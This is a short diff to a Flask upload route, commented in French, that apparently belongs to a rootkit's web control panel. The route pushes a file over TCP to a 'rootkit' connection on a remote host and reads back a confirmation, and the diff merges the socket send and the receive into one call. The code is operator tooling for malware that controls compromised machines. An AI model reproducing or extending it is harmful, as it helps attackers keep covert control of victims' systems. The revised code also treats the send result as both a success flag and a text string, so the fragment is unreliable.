@@ -42,20 +42,16 @@ def upload():
             flash(f"✅ Rootkit prêt pour l'upload vers {remote_path}", "success")
 
             # 2. Envoi binaire chiffré du fichier
-            success = cfg.rootkit_connexion.get_tcp_object()._network_handler.send(
-                cfg.rootkit_connexion.get_tcp_object()._client_socket,
-                file_data
-            )
+            success = cfg.rootkit_connexion.send(file_data, use_history=False, channel="tcp")
 
             if not success:
                 flash("❌ Échec de l’envoi du fichier.", 'error')
             else:
                 # Ici on attend la confirmation du rootkit
-                confirmation = cfg.rootkit_connexion.receive_from_client()
-                if confirmation and "successfully" in confirmation.lower():
+                if "successfully" in success.lower():
                     flash("📤 Fichier envoyé avec succès !", 'success')
                 else:
-                    flash(f"❌ Problème de confirmation : {confirmation}", 'error')
+                    flash(f"❌ Problème de confirmation : {success}", 'error')
 
         except Exception as e:
             flash(f"Erreur lors de l’envoi : {e}", 'error')
